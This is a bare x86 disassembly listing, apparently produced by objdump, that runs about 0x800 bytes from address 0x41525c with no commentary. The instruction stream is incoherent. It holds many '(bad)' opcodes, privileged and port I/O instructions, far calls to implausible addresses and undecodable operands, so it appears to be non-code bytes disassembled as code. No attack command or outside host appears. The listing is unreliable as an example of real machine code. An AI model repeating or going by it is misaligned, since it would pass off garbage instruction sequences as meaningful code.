  41525c:	imul   eax,ebp,0x4ecb31d6
  415262:	mov    dl,0x8d
  415264:	rcl    ebp,0x52
  415267:	sub    bh,BYTE PTR [eax]
  415269:	shl    DWORD PTR [edi],1
  41526b:	inc    esi
  41526c:	add    bh,0x3e
  41526f:	test   BYTE PTR [eax-0x46],dh
  415272:	mov    eax,0xf191d2aa
  415277:	inc    edi
  415278:	xchg   ebp,eax
  415279:	or     bl,dh
  41527b:	call   0xcf4856b3
  415280:	retf   0xba22
  415283:	push   eax
  415284:	stc    
  415285:	xchg   esp,ebp
  415287:	ficomp DWORD PTR [eax-0x6d8a1afa]
  41528d:	sub    eax,0x6680923e
  415292:	sbb    bl,cl
  415294:	push   esp
  415295:	xor    DWORD PTR ds:0x1a21b6a1,edi
  41529b:	ds jns 0x415310
  41529e:	sub    cl,BYTE PTR [ecx+edi*1-0x5c]
  4152a2:	sub    eax,0xcf3826e3
  4152a7:	cli    
  4152a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152a9:	add    edi,esp
  4152ab:	loopne 0x415306
  4152ad:	cmp    DWORD PTR [eax],edx
  4152af:	xor    BYTE PTR [edi],bl
  4152b1:	lahf   
  4152b2:	mov    dh,BYTE PTR [edx+0x272738c4]
  4152b8:	dec    ebp
  4152b9:	mov    bl,0x5b
  4152bb:	xchg   BYTE PTR [esi-0x7031a822],bh
  4152c1:	mov    cl,0x2f
  4152c3:	sbb    eax,0x5e428ff1
  4152c8:	sbb    eax,0x1f1c4e0
  4152cd:	lock mov ecx,edx
  4152d0:	mov    cl,0xc4
  4152d2:	retf   
  4152d3:	loope  0x415338
  4152d5:	jmp    0x89925250
  4152da:	xor    eax,0x1f021f81
  4152df:	and    DWORD PTR [ecx+0x443d1e5a],edx
  4152e5:	scas   eax,DWORD PTR es:[edi]
  4152e6:	mov    al,ds:0x64d5532b
  4152eb:	xchg   esi,eax
  4152ec:	nop
  4152ed:	pop    ebp
  4152ee:	pop    ecx
  4152ef:	fidivr WORD PTR [edx+0x5d]
  4152f2:	mov    esi,0x71044430
  4152f7:	out    dx,eax
  4152f8:	retf   0x6a92
  4152fb:	mov    edx,0x7355bee4
  415300:	pop    ebp
  415301:	pop    es
  415302:	mov    ch,0xfe
  415304:	sub    bh,BYTE PTR [eax-0x27]
  415307:	inc    ecx
  415308:	lods   al,BYTE PTR ds:[esi]
  415309:	cli    
  41530a:	ins    DWORD PTR es:[edi],dx
  41530b:	sbb    eax,0x259befcf
  415310:	inc    ebx
  415311:	mov    dh,0xeb
  415313:	imul   ebx,DWORD PTR [ebx],0x7a466807
  415319:	mov    DWORD PTR [esi],ecx
  41531b:	retf   0x4866
  41531e:	push   es
  41531f:	push   0xfffffff0
  415321:	jle    0x4152c6
  415323:	(bad)  
  415324:	rol    BYTE PTR [edi-0x38],cl
  415327:	mov    cl,0x43
  415329:	ror    BYTE PTR [ecx],cl
  41532b:	jge    0x4152c2
  41532d:	mov    ds:0x70ed209b,eax
  415332:	cmp    BYTE PTR [edi],dl
  415334:	popa   
  415335:	mov    ebp,0x350dd52c
  41533a:	enter  0x1c4a,0xbd
  41533e:	fucomip st,st(4)
  415340:	cdq    
  415341:	leave  
  415342:	dec    edx
  415343:	outs   dx,DWORD PTR ds:[esi]
  415344:	dec    eax
  415345:	and    ecx,DWORD PTR [ecx]
  415347:	jg     0x41534e
  415349:	cmc    
  41534a:	xor    ch,BYTE PTR [ecx-0x19]
  41534d:	popa   
  41534e:	jno    0x415353
  415350:	mov    gs,eax
  415352:	pop    eax
  415353:	cdq    
  415354:	(bad)  
  415355:	into   
  415356:	cmp    DWORD PTR [esi-0x649d5568],0xffffffae
  41535d:	push   es
  41535e:	fnstenv [edi-0x24]
  415361:	adc    BYTE PTR [esi-0x80],ch
  415364:	lds    ecx,FWORD PTR [ebx-0x5b420c98]
  41536a:	retf   0xc9b7
  41536d:	jmp    0xe2ba4ef7
  415372:	or     BYTE PTR [ecx+ebp*2],al
  415375:	pcmpeqw mm4,QWORD PTR [ebx]
  415378:	inc    ebx
  415379:	call   0x9024:0x8f3ddf81
  415380:	and    BYTE PTR [edx-0x7f],cl
  415383:	repnz mov ds:0x8696d490,eax
  415389:	fwait
  41538a:	mov    ebp,DWORD PTR [ecx-0x58fb420]
  415390:	call   0x9a60a4b9
  415395:	inc    ebx
  415396:	jp     0x4153a5
  415398:	mov    esp,gs
  41539a:	jp     0x41538b
  41539c:	rcl    BYTE PTR ds:[ebp*8+0x23d7dd9],cl
  4153a4:	fcom   DWORD PTR [ebx+0x667b324f]
  4153aa:	xchg   esp,eax
  4153ab:	cmc    
  4153ac:	jno    0x4153f0
  4153ae:	push   ebx
  4153af:	jns    0x415347
  4153b1:	add    ah,bl
  4153b3:	mov    ss,WORD PTR [edx+0x8]
  4153b6:	rcr    BYTE PTR [eax-0x71],0xb3
  4153ba:	sub    al,BYTE PTR [ebx+eax*1]
  4153bd:	cmp    ch,dh
  4153bf:	sbb    DWORD PTR [edi+0x22],ebp
  4153c2:	jbe    0x415398
  4153c4:	ret    
  4153c5:	push   ss
  4153c6:	mov    ds:0x61c92856,eax
  4153cb:	xlat   BYTE PTR ds:[ebx]
  4153cc:	(bad)  
  4153cd:	rcl    DWORD PTR [edx],0xfc
  4153d0:	pop    ds
  4153d1:	stos   BYTE PTR es:[edi],al
  4153d2:	pop    es
  4153d3:	mov    eax,0xd621f7d9
  4153d8:	fidiv  DWORD PTR [edx-0x43]
  4153db:	push   ds
  4153dc:	aad    0x14
  4153de:	sbb    dl,bh
  4153e0:	jmp    0x4153c4
  4153e2:	enter  0x60f9,0xb2
  4153e6:	ret    0x3256
  4153e9:	addr16 xchg ecx,eax
  4153eb:	loope  0x4153e5
  4153ed:	mov    esi,0xb80f5d10
  4153f2:	xchg   esi,edi
  4153f4:	hlt    
  4153f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f6:	xchg   edi,eax
  4153f7:	sahf   
  4153f8:	mov    ah,0xba
  4153fa:	les    eax,FWORD PTR [edi+0x34]
  4153fd:	mov    DWORD PTR [edx+0x62],edi
  415400:	push   cs
  415401:	inc    eax
  415402:	add    edx,DWORD PTR [eax]
  415404:	(bad)  
  415405:	imul   esi,DWORD PTR [ecx+ebx*4-0x4bdb7599],0x6
  41540d:	push   edi
  41540e:	daa    
  41540f:	dec    esi
  415410:	test   esp,edx
  415412:	icebp  
  415413:	mov    esi,0x18a0536
  415418:	dec    esi
  415419:	neg    DWORD PTR [ebx+eax*4+0x6e]
  41541d:	test   DWORD PTR [eax+ecx*2],eax
  415420:	aaa    
  415421:	jmp    0x4153bb
  415423:	into   
  415424:	sbb    ch,ah
  415426:	pop    es
  415427:	scas   eax,DWORD PTR es:[edi]
  415428:	gs mov esp,0xf873c9d0
  41542e:	pop    ebp
  41542f:	es scas eax,DWORD PTR es:[edi]
  415431:	icebp  
  415432:	dec    esi
  415433:	pop    es
  415434:	sahf   
  415435:	test   ebx,0x189ce2ec
  41543b:	or     dl,ch
  41543d:	int    0x39
  41543f:	push   ecx
  415440:	push   ebp
  415441:	in     al,0x2f
  415443:	inc    BYTE PTR [edx+0xdb24d95]
  415449:	retf   0x6909
  41544c:	inc    ecx
  41544d:	xor    bh,ah
  41544f:	add    al,0x5d
  415451:	lock cmp eax,0x8fd001fe
  415457:	mov    dl,0x1b
  415459:	push   cs
  41545a:	arpl   ax,sp
  41545c:	aad    0xe7
  41545e:	inc    ecx
  41545f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415460:	fs pop ebx
  415462:	out    dx,eax
  415463:	jl     0x415481
  415465:	cmp    BYTE PTR [esi+0x100c4d22],0x7c
  41546c:	(bad)  
  41546d:	and    ch,0x52
  415470:	pop    ecx
  415471:	mov    ch,0xf8
  415473:	fs retf 
  415475:	and    bh,bh
  415477:	call   FWORD PTR [ebx+0x38]
  41547a:	push   esp
  41547b:	push   ds
  41547c:	adc    DWORD PTR [edi+ebp*1-0x24905c7d],ebp
  415483:	mov    ecx,DWORD PTR [edi-0x620f43b]
  415489:	or     esi,edx
  41548b:	mov    eax,0x5a583efb
  415490:	ffreep st(4)
  415492:	cmc    
  415493:	pop    esi
  415494:	inc    ecx
  415495:	imul   esi,DWORD PTR [edi],0xdf348f92
  41549b:	popf   
  41549c:	jne    0x415507
  41549e:	fadd   st,st(3)
  4154a0:	cmp    al,0xed
  4154a2:	rcl    esp,cl
  4154a4:	inc    eax
  4154a5:	xor    edi,0xf9ff5154
  4154ab:	adc    esi,edx
  4154ad:	adc    cl,BYTE PTR [ebx]
  4154af:	or     BYTE PTR [ecx+0x6c32b13f],0xb6
  4154b6:	inc    ebp
  4154b7:	bound  edx,QWORD PTR [edi]
  4154b9:	fsubr  QWORD PTR [eax+0x5f]
  4154bc:	loopne 0x4154db
  4154be:	xchg   BYTE PTR [eax-0x43],dh
  4154c1:	jmp    0x58a4:0x8d5cfec7
  4154c8:	push   ebx
  4154c9:	xor    edx,DWORD PTR [edx]
  4154cb:	shr    ah,cl
  4154cd:	out    dx,al
  4154ce:	es (bad) 
  4154d0:	jno    0x4154d1
  4154d2:	push   edx
  4154d3:	fst    DWORD PTR [ecx+0x42b36f98]
  4154d9:	jbe    0x4154b8
  4154db:	ja     0x415507
  4154dd:	inc    esp
  4154de:	es inc ebp
  4154e0:	(bad)  [ecx-0x6c962f9f]
  4154e6:	jno    0x4154ce
  4154e8:	mov    ds,WORD PTR [edx+0x72]
  4154eb:	addr16 ds lahf 
  4154ee:	call   0x26b73722
  4154f3:	(bad)  
  4154f4:	cmp    ecx,eax
  4154f6:	cdq    
  4154f7:	rol    DWORD PTR [edx],cl
  4154f9:	and    cl,ch
  4154fb:	jbe    0x4154eb
  4154fd:	mov    DWORD PTR [ebp+ecx*8+0x729328cf],ebx
  415504:	sbb    dh,ch
  415506:	inc    ecx
  415507:	xchg   ecx,eax
  415508:	jno    0x4154bf
  41550a:	icebp  
  41550b:	retf   
  41550c:	xchg   edi,eax
  41550d:	cmp    BYTE PTR [esi-0x53a652f4],bl
  415513:	jmp    0x415501
  415515:	and    bh,BYTE PTR [edx+0x3a214807]
  41551b:	push   es
  41551c:	pushf  
  41551d:	inc    eax
  41551e:	mov    edx,0x509b5720
  415523:	popf   
  415524:	push   ebp
  415525:	cmp    eax,0x199bed9e
  41552a:	lock aad 0xf1
  41552d:	out    dx,eax
  41552e:	aaa    
  41552f:	pop    edi
  415530:	aas    
  415531:	sub    eax,0x82b58526
  415536:	pop    ss
  415537:	in     eax,0x66
  415539:	popa   
  41553a:	push   ss
  41553b:	frstor [edi]
  41553d:	cmp    al,ch
  41553f:	mov    fs,WORD PTR [ebx-0x12]
  415542:	push   ebx
  415543:	fld    TBYTE PTR gs:[edi]
  415546:	jae    0x415580
  415548:	pop    ecx
  415549:	fwait
  41554a:	ss loop 0x415503
  41554d:	out    0x30,eax
  41554f:	int    0x0
  415551:	pop    ebp
  415552:	sbb    BYTE PTR [eax+0x53],al
  415555:	pop    esi
  415556:	xchg   edi,eax
  415557:	xchg   ebx,eax
  415558:	shl    DWORD PTR [edi-0x26c7f53e],0x35
  41555f:	jns    0x4155c7
  415561:	scas   al,BYTE PTR es:[edi]
  415562:	outs   dx,DWORD PTR ds:[esi]
  415563:	adc    DWORD PTR [ecx+0x60],0xfffffff0
  415567:	mov    ecx,0x6959a461
  41556c:	cs sub al,0x3c
  41556f:	mov    ch,0xcf
  415571:	mov    esi,0x15905c22
  415576:	xchg   edx,eax
  415577:	mov    eax,ds:0x91a83347
  41557c:	aam    0x1c
  41557e:	loop   0x4155fb
  415580:	push   ebx
  415581:	jo     0x4155d8
  415583:	les    ebx,FWORD PTR [edi]
  415585:	mov    esi,0xbd8f933e
  41558a:	sti    
  41558b:	and    esp,DWORD PTR [edx-0x1571ab65]
  415591:	mov    dl,0x9
  415593:	lahf   
  415594:	xor    dh,BYTE PTR [edx+0x5f]
  415597:	adc    ebx,eax
  415599:	in     eax,dx
  41559a:	add    DWORD PTR [edi+0x4d],ebp
  41559d:	mov    ecx,0x4b51300e
  4155a2:	cld    
  4155a3:	stc    
  4155a4:	cmp    DWORD PTR [ebp-0x730348b8],0xa16a3261
  4155ae:	push   ds
  4155af:	rol    edi,cl
  4155b1:	adc    ah,BYTE PTR [ecx+0x5b]
  4155b4:	sbb    BYTE PTR [edi-0x30],0x24
  4155b8:	inc    ebp
  4155b9:	out    dx,al
  4155ba:	(bad)  
  4155bb:	in     al,dx
  4155bc:	imul   edx,edi,0xad83bc16
  4155c2:	(bad)  
  4155c3:	repz xchg esp,eax
  4155c5:	mov    bh,0x4f
  4155c7:	dec    esi
  4155c8:	iret   
  4155c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155ca:	stos   DWORD PTR es:[edi],eax
  4155cb:	sbb    al,0x6f
  4155cd:	xchg   ebp,eax
  4155ce:	cmovs  ecx,DWORD PTR [edx]
  4155d1:	adc    eax,0x85befcc9
  4155d6:	mov    bh,0x3b
  4155d8:	sbb    bh,BYTE PTR [eax-0x65]
  4155db:	out    dx,al
  4155dc:	add    esi,ebp
  4155de:	xchg   edi,eax
  4155df:	adc    esp,DWORD PTR ds:0xb6f02c83
  4155e5:	outs   dx,BYTE PTR ds:[esi]
  4155e6:	popa   
  4155e7:	dec    ebx
  4155e8:	xor    esi,edi
  4155ea:	sbb    ebx,0x97330fcc
  4155f0:	jmp    0xd902:0xc22a23e6
  4155f7:	inc    edx
  4155f8:	popa   
  4155f9:	pusha  
  4155fa:	sar    BYTE PTR [edi-0x67cd91b2],0xcc
  415601:	popf   
  415602:	enter  0xd2fb,0x7
  415606:	popf   
  415607:	popf   
  415608:	mov    ebx,DWORD PTR [edi+edx*8+0x4]
  41560c:	dec    edx
  41560d:	mov    BYTE PTR [ecx],dh
  41560f:	mov    ecx,0x9f30cfd5
  415614:	ja     0x415676
  415616:	cmp    DWORD PTR [eax-0x29da13e0],0x5ef81336
  415620:	pusha  
  415621:	dec    ebp
  415622:	jecxz  0x4155e5
  415624:	mov    ?,WORD PTR [ecx+0x18]
  415627:	dec    esi
  415628:	out    0x3d,al
  41562a:	mov    ds:0xae262246,eax
  41562f:	pop    es
  415630:	xchg   esi,eax
  415631:	aad    0x63
  415633:	and    DWORD PTR [edi+0x12e78326],0x58
  41563a:	fwait
  41563b:	jp     0x415609
  41563d:	xor    eax,DWORD PTR ds:0x348361a8
  415643:	xlat   BYTE PTR ds:[ebx]
  415644:	(bad)  
  415645:	jmp    0x415686
  415647:	mov    ecx,0x62a3a50b
  41564c:	sub    esp,esp
  41564e:	mov    ds:0xe2095f1a,eax
  415653:	jecxz  0x4156a4
  415655:	das    
  415656:	push   DWORD PTR [eax+0x69]
  415659:	and    BYTE PTR [eax-0x3c],dl
  41565c:	mov    dl,cl
  41565e:	adc    BYTE PTR [edx],al
  415660:	adc    DWORD PTR [edi],esp
  415662:	ins    BYTE PTR es:[edi],dx
  415663:	and    DWORD PTR [edi],edx
  415665:	jge    0x4156a3
  415667:	retf   0xac4
  41566a:	push   eax
  41566b:	aam    0x8f
  41566d:	fwait
  41566e:	adc    DWORD PTR ds:0xbd683797,eax
  415674:	fcomp  DWORD PTR [ebx+0x6a]
  415677:	ret    
  415678:	adc    al,0x6
  41567a:	push   0x56
  41567c:	mov    DWORD PTR [ecx-0x643cc2ca],esi
  415682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415683:	sti    
  415684:	aam    0x73
  415686:	scas   al,BYTE PTR es:[edi]
  415687:	sub    esi,esp
  415689:	not    BYTE PTR [ebx]
  41568b:	jecxz  0x4156c8
  41568d:	push   ds
  41568e:	cmp    eax,0x5beb2766
  415693:	push   ss
  415694:	icebp  
  415695:	inc    ebx
  415696:	or     ebp,esi
  415698:	dec    esp
  415699:	(bad)  
  41569a:	test   BYTE PTR [eax],bl
  41569c:	test   DWORD PTR [eax],0xbc233b6
  4156a2:	int3   
  4156a3:	sub    eax,0x99bf468f
  4156a8:	inc    esi
  4156a9:	push   ebx
  4156aa:	and    BYTE PTR [eax],dl
  4156ac:	repnz loop 0x4156ba
  4156af:	fiadd  DWORD PTR [eax-0x7b966fa]
  4156b5:	xchg   ebp,eax
  4156b6:	outs   dx,DWORD PTR ds:[esi]
  4156b7:	sbb    bl,BYTE PTR [edx]
  4156b9:	cmp    eax,edx
  4156bb:	push   ebx
  4156bc:	arpl   WORD PTR [esi],ax
  4156be:	push   esi
  4156bf:	add    eax,0x3e91cdad
  4156c4:	push   edi
  4156c5:	push   esp
  4156c6:	adc    eax,DWORD PTR [edi+0x16ded9b3]
  4156cc:	lods   al,BYTE PTR ds:[esi]
  4156cd:	jecxz  0x415706
  4156cf:	inc    ebx
  4156d0:	test   eax,0x33914e89
  4156d5:	dec    edi
  4156d6:	into   
  4156d7:	ds dec edx
  4156d9:	add    eax,0x731259b7
  4156de:	xchg   esi,eax
  4156df:	adc    cl,BYTE PTR [edx+0x7fddec28]
  4156e5:	jg     0x4156b4
  4156e7:	repnz xchg eax,esp
  4156ea:	in     eax,dx
  4156eb:	jo     0x4156a1
  4156ed:	iret   
  4156ee:	scas   al,BYTE PTR es:[edi]
  4156ef:	mov    ?,WORD PTR [ebp+0x2ff09ce2]
  4156f5:	dec    ebp
  4156f6:	loop   0x415760
  4156f8:	addr16 jl 0x415754
  4156fb:	mov    ch,0x57
  4156fd:	sbb    esi,DWORD PTR [ebx]
  4156ff:	or     dh,bh
  415701:	push   ebp
  415702:	(bad)  
  415703:	int3   
  415704:	pop    ss
  415705:	cmp    ah,BYTE PTR [ebx+edi*8+0x67510c88]
  41570c:	fcomp  DWORD PTR [ebx]
  41570e:	xchg   BYTE PTR cs:[ebp+0x2a],dh
  415712:	call   0x79ddadfc
  415717:	sub    ah,BYTE PTR [eax+ebp*1]
  41571a:	mov    ch,0x16
  41571c:	inc    ebp
  41571d:	adc    dh,BYTE PTR ds:0x6ba9f3ec
  415723:	add    bl,BYTE PTR [ebp+0x7a]
  415726:	imul   edx,DWORD PTR [esp+eiz*8+0x4f],0x41c5ddf5
  41572e:	adc    al,0xd5
  415730:	(bad)  
  415731:	jb     0x4156fa
  415733:	popa   
  415734:	gs stos BYTE PTR es:[edi],al
  415736:	inc    eax
  415737:	xchg   edx,eax
  415738:	test   esp,esp
  41573a:	int    0x7b
  41573c:	xchg   edi,eax
  41573d:	lods   eax,DWORD PTR ds:[esi]
  41573e:	jmp    0x41500c02
  415743:	(bad)  
  415744:	cmc    
  415745:	enter  0x5e0b,0x0
  415749:	sub    bl,BYTE PTR [ecx-0x70]
  41574c:	sbb    bh,dl
  41574e:	mov    eax,0x781a3b5e
  415753:	aad    0xb8
  415755:	sar    DWORD PTR [eax+ebp*1+0x57],cl
  415759:	push   edx
  41575a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41575b:	or     eax,0x2faa2225
  415760:	fxch   st(1)
  415762:	xlat   BYTE PTR ds:[ebx]
  415763:	arpl   WORD PTR [edx-0x67],sp
  415766:	fnstcw WORD PTR [ebp+ebp*2+0x5c9155e5]
  41576d:	out    0x3a,eax
  41576f:	pop    edi
  415770:	in     al,0xae
  415772:	xor    DWORD PTR [eax-0x41],edx
  415775:	dec    edx
  415776:	stos   DWORD PTR es:[edi],eax
  415777:	cld    
  415778:	sar    DWORD PTR [eax],1
  41577a:	jecxz  0x4157e1
  41577c:	mov    edx,0x948306ef
  415781:	je     0x4157af
  415783:	xchg   edx,eax
  415784:	(bad)  
  415785:	jae    0x41577f
  415787:	mov    ebx,0x43ed91f
  41578c:	mov    ecx,0xd2f920aa
  415791:	lea    edx,[ebx]
  415793:	mov    edi,DWORD PTR [ecx+0x2b]
  415796:	cmp    DWORD PTR [ecx-0x311338b4],edi
  41579c:	dec    eax
  41579d:	xor    ch,dl
  41579f:	xchg   ecx,eax
  4157a0:	xor    eax,0x38f6ee3
  4157a5:	fwait
  4157a6:	mov    ch,0x23
  4157a8:	xor    ebp,DWORD PTR [eax+eiz*4]
  4157ab:	and    al,0x4c
  4157ad:	sub    cl,bh
  4157af:	mov    ah,0x7e
  4157b1:	jb     0x4157bc
  4157b3:	out    dx,eax
  4157b4:	pop    edi
  4157b5:	ja     0x4157f5
  4157b7:	xor    bl,cl
  4157b9:	cmp    edi,DWORD PTR [esi-0x3c497a07]
  4157bf:	nop
  4157c0:	push   eax
  4157c1:	cmp    BYTE PTR [esi+ebx*4+0x3ddbe850],ch
  4157c8:	into   
  4157c9:	mov    esp,0x49dc4ff4
  4157ce:	loope  0x41575c
  4157d0:	call   0x9591:0xefc063ae
  4157d7:	fidivr DWORD PTR [edi-0x19dc1f3f]
  4157dd:	test   al,0xe
  4157df:	xchg   ebp,esi
  4157e1:	sbb    eax,DWORD PTR [eax+edx*8+0x7f]
  4157e5:	sbb    DWORD PTR [ebp+0x4ee161cb],ecx
  4157eb:	cmp    al,bh
  4157ed:	sahf   
  4157ee:	sbb    DWORD PTR [eax-0x64b0cd6c],edi
  4157f4:	xchg   ecx,eax
  4157f5:	ret    
  4157f6:	inc    ebx
  4157f7:	mov    dl,0x26
  4157f9:	stos   BYTE PTR es:[edi],al
  4157fa:	in     eax,dx
  4157fb:	cmp    cl,cl
  4157fd:	and    BYTE PTR [ebx],ch
  4157ff:	push   esi
  415800:	push   ebp
  415801:	inc    ebx
  415802:	outs   dx,DWORD PTR ds:[esi]
  415803:	mov    dl,ch
  415805:	sar    BYTE PTR fs:[ebx-0x2],cl
  415809:	mov    ch,0xc9
  41580b:	cmp    al,0xf2
  41580d:	inc    edx
  41580e:	out    dx,al
  41580f:	aad    0x80
  415811:	dec    esp
  415812:	out    0xd6,eax
  415814:	sbb    DWORD PTR [ecx],esi
  415816:	push   ebx
  415817:	rol    DWORD PTR [ecx],1
  415819:	dec    edx
  41581a:	jmp    0xad7070ab
  41581f:	mov    esp,0xb00d2acd
  415824:	mov    ebp,0xd3292bf7
  415829:	jno    0x415812
  41582b:	shl    DWORD PTR [esi+0x744120ac],0x4a
  415832:	or     al,0x14
  415834:	add    DWORD PTR [esi-0x41c28434],0x68
  41583b:	cmp    eax,0x6c871c4b
  415840:	(bad)  
  415841:	stos   DWORD PTR es:[edi],eax
  415842:	push   edx
  415843:	adc    al,0xfd
  415845:	lods   al,BYTE PTR ds:[esi]
  415846:	(bad)  
  415847:	loopne 0x415821
  415849:	dec    edi
  41584a:	inc    ecx
  41584b:	aas    
  41584c:	push   es
  41584d:	mov    dh,0x4a
  41584f:	daa    
  415850:	inc    esi
  415851:	mov    ah,0x9e
  415853:	jnp    0x4157f7
  415855:	mov    es,WORD PTR ds:0x73b7ccb3
  41585b:	pop    esp
  41585c:	clc    
  41585d:	sbb    esp,edx
  41585f:	add    BYTE PTR [ecx+0x4e],cl
  415862:	sub    al,0x37
  415864:	sub    al,0xf2
  415866:	inc    edi
  415867:	out    dx,eax
  415868:	push   ds
  415869:	daa    
  41586a:	lods   al,BYTE PTR ds:[esi]
  41586b:	js     0x415849
  41586d:	pop    esi
  41586e:	popf   
  41586f:	lea    ebp,[ecx-0xf]
  415872:	mov    bh,0x42
  415874:	int    0xf1
  415876:	jnp    0x415889
  415878:	icebp  
  415879:	jnp    0x4158f5
  41587b:	mov    ebp,0x45756bbd
  415880:	dec    ebp
  415881:	add    eax,0xca3ce846
  415886:	icebp  
  415887:	xor    ebp,DWORD PTR [esi+0xb494086]
  41588d:	sar    DWORD PTR [ecx+edi*8],0xf0
  415891:	xor    esi,DWORD PTR [ecx-0x2f5d7daf]
  415897:	mov    bl,0x7e
  415899:	mov    ebp,0x69878bb2
  41589e:	(bad)  
  41589f:	mov    BYTE PTR ds:[ebp+0x38],ch
  4158a3:	fmul   DWORD PTR [ebx+ebp*4-0x434bb96c]
  4158aa:	jns    0x415910
  4158ac:	and    ecx,ebp
  4158ae:	jnp    0x41585b
  4158b0:	mov    ecx,0xa7445f3d
  4158b5:	mov    ds:0x23308747,eax
  4158ba:	outs   dx,BYTE PTR ds:[esi]
  4158bb:	retf   0x4576
  4158be:	fs (bad) 
  4158c0:	pop    ecx
  4158c1:	jmp    0x6706247c
  4158c6:	int3   
  4158c7:	int    0xd
  4158c9:	mov    ecx,edi
  4158cb:	mov    esi,0x730f8f73
  4158d0:	into   
  4158d1:	jb     0x4158ee
  4158d3:	stc    
  4158d4:	aam    0xec
  4158d6:	out    dx,eax
  4158d7:	lahf   
  4158d8:	or     bl,ch
  4158da:	call   0x6fd5f700
  4158df:	lea    esi,[ecx-0x4]
  4158e2:	in     eax,dx
  4158e3:	push   0x8da4d60d
  4158e8:	popa   
  4158e9:	dec    esi
  4158ea:	push   esp
  4158eb:	arpl   WORD PTR [edi],bx
  4158ed:	push   0x987986eb
  4158f2:	icebp  
  4158f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158f4:	scas   eax,DWORD PTR es:[edi]
  4158f5:	repz retf 0x2822
  4158f9:	lea    edi,[ebx*4+0x7afbb33d]
  415900:	lock dec esp
  415902:	sbb    DWORD PTR [ebx-0x3a],eax
  415905:	dec    esp
  415906:	mov    esi,0xb7f1444b
  41590b:	loopne 0x415892
  41590d:	fsub   st,st(7)
  41590f:	ficomp DWORD PTR [edi-0x75dc3c1]
  415915:	pop    esi
  415916:	in     eax,dx
  415917:	inc    eax
  415918:	or     DWORD PTR [ecx-0x6e9b85d],edi
  41591e:	sub    BYTE PTR [eax+0x59d79002],0x5b
  415925:	sub    ah,BYTE PTR [edx]
  415927:	ret    0x381b
  41592a:	shr    BYTE PTR [ebx+0x75],1
  41592d:	int3   
  41592e:	cmc    
  41592f:	cmp    eax,0xb0827a0c
  415934:	(bad)
  415937:	pop    DWORD PTR [ebx+0x29]
  41593a:	aas    
  41593b:	jle    0x4158c8
  41593d:	fnstsw WORD PTR [ebx+0x4766c98]
  415943:	not    DWORD PTR [ebx+ebx*4]
  415946:	mov    edx,0x4fb0e1aa
  41594b:	arpl   WORD PTR [edi-0x10],dx
  41594e:	inc    eax
  41594f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415950:	les    esp,FWORD PTR [ebx]
  415952:	jp     0x4158f9
  415954:	fs pushf 
  415956:	mov    ch,0x7d
  415958:	lods   al,BYTE PTR ds:[esi]
  415959:	aam    0x76
  41595b:	stos   BYTE PTR es:[edi],al
  41595c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41595d:	mov    edi,eax
  41595f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415960:	jg     0x41595d
  415962:	scas   eax,DWORD PTR es:[edi]
  415963:	in     eax,dx
  415964:	pop    edx
  415965:	mov    ah,0x78
  415967:	into   
  415968:	out    0x40,al
  41596a:	or     al,0x44
  41596c:	daa    
  41596d:	add    eax,0x81add1b2
  415972:	sub    eax,edx
  415974:	popa   
  415975:	sbb    BYTE PTR [ebx],dh
  415977:	xor    al,0xbc
  415979:	jmp    0x20192f5e
  41597e:	int    0xb3
  415980:	mov    ebx,DWORD PTR [ebp+0x720ed489]
  415986:	stos   BYTE PTR es:[edi],al
  415987:	pop    ebx
  415988:	retf   0x72c8
  41598b:	arpl   WORD PTR [esi],bp
  41598d:	cs dec ebx
  41598f:	mov    DWORD PTR [esi-0x7e],edx
  415992:	inc    ax
  415994:	stc    
  415995:	mov    esi,0x56e15cd4
  41599a:	jae    0x4159de
  41599c:	mov    ds:0x8acad1a4,eax
  4159a1:	outs   dx,BYTE PTR ds:[esi]
  4159a2:	cdq    
  4159a3:	sbb    bl,BYTE PTR [edx+0x30]
  4159a6:	fcomp  DWORD PTR [ebx]
  4159a8:	or     bh,ah
  4159aa:	rcl    edx,1
  4159ac:	dec    edi
  4159ad:	xor    ebx,esi
  4159af:	(bad)  
  4159b0:	mov    esi,0x1f74934e
  4159b5:	pop    esp
  4159b6:	out    0x60,al
  4159b8:	outs   dx,DWORD PTR ds:[esi]
  4159b9:	mov    dl,0x31
  4159bb:	fcmovb st,st(1)
  4159bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159be:	xlat   BYTE PTR ds:[ebx]
  4159bf:	fucomip st,st(7)
  4159c1:	imul   ebp,DWORD PTR ds:0x2cd293e4,0xb5966354
  4159cb:	push   esi
  4159cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159cd:	loopne 0x415971
  4159cf:	xchg   esp,eax
  4159d0:	imul   ebp,edi,0x69d17363
  4159d6:	xchg   ebp,eax
  4159d7:	test   DWORD PTR [eax+0x639e7131],ebx
  4159dd:	mov    al,0x3b
  4159df:	mov    cl,BYTE PTR [edi-0x52]
  4159e2:	inc    BYTE PTR [ebp-0x40c06ee8]
  4159e8:	fmul   QWORD PTR [ebx+0x2189a30e]
  4159ee:	push   ebx
  4159ef:	mov    bl,0x19
  4159f1:	hlt    
  4159f2:	sbb    al,0x2f
  4159f4:	mov    ecx,0x1bce5279
  4159f9:	int    0x1
  4159fb:	outs   dx,BYTE PTR ds:[esi]
  4159fc:	pop    ecx
  4159fd:	add    eax,0x60705ab8
  415a02:	(bad)  
  415a03:	clc    
  415a04:	xor    DWORD PTR [ebx],edx
  415a06:	sbb    BYTE PTR [ebx+0x4d1982c3],0x8
  415a0d:	mov    ecx,0xf4b08f7a
  415a12:	pop    bx
  415a14:	es sbb edx,ecx
  415a17:	fadd   DWORD PTR [edx+0x10f8bb78]
  415a1d:	push   0x75
  415a1f:	(bad)  
  415a20:	shl    BYTE PTR [eax],1
  415a22:	or     cl,BYTE PTR [ebx+0x63]
  415a25:	mov    ds:0x9079cf5e,al
  415a2a:	dec    ebp
  415a2b:	mov    ebp,?
  415a2d:	push   ebp
  415a2e:	in     eax,dx
  415a2f:	fistp  DWORD PTR [eax+0x7b9e97eb]
